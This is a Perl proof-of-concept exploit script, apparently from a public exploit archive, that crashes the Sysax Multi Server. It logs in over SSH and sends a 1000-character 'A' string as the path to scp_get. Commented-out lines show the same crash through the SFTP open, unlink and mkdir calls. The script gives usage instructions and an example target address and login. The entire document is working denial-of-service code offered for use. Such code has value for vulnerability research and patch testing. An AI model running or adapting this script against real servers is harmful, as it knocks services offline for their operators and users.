#!/usr/bin/perl
#leinakesi[at]gmail.com
#Sysax Multi Server "open", "unlink", "mkdir", "scp_get" Commands DoS Vulnerabilities

use Net::SSH2;
use Getopt::Std;

$FUZZ = "A" x 1000;

getopts('S:P:u:p:', \%opts);
$server = $opts{'S'}; $port = $opts{'P'}; $user = $opts{'u'}; $pass = $opts{'p'};

if(!defined($server) || !defined($port) || !defined($user) || !defined($pass) ) {
	print "usage:\n\tperl	test.pl -S [IP] -P [port] -u [user] -p [password]\nexample:\n";
	print "\tperl	test.pl -S 192.168.48.114 -P 22 -u chloe -p 111111\n";
	exit(0);
}

$ssh2 = Net::SSH2->new();
$ssh2->connect($server, $port) || die "can not connect the server, please check.\n"; $ssh2->auth_password($user, $pass) || die "you sure user name and password are correct?\n"; #any of the following commands will cause the server carsh.

$scpget = $ssh2->scp_get($FUZZ) || die "server crashed.\n";
#	$sftp = $ssh2->sftp(); $o1 = $sftp->open($FUZZ);
#	$sftp = $ssh2->sftp(); $u = $sftp->unlink(FUZZ);
#	$sftp = $ssh2->sftp(); $m = $sftp->mkdir($FUZZ);


print "\nover\n";

$ssh2->disconnect();
exit(0);
